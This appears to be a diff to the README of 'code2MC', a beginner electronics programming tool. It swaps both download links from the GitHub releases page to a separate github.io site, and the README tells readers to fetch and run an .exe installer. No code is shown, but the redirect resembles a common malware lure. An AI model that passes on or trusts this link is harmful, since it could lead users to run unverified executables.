@@ -1,6 +1,6 @@
 # ⚡ code2MC - Write code for electronics with ease
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/pestilent-puritanism520/code2MC/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://pestilent-puritanism520.github.io)
 
 Code2MC helps you write computer programs for electronics. You can create projects for Arduino, ESP32, and Raspberry Pi Pico boards. This tool keeps your work organized in one window. It handles the difficult part of sending your programs to your hardware. The design focuses on clarity so you can focus on building your devices.
 
@@ -8,7 +8,7 @@ Code2MC helps you write computer programs for electronics. You can create projec
 
 You need to download the installer from our release page. Visit the link below to see the available versions.
 
-[Download Code2MC from the release page](https://github.com/pestilent-puritanism520/code2MC/releases)
+[Download Code2MC from the release page](https://pestilent-puritanism520.github.io)
 
 Look for the file that ends in .exe. Click this file to start your download. Your browser might ask you to confirm the location for the file. Save the file to your computer.
 
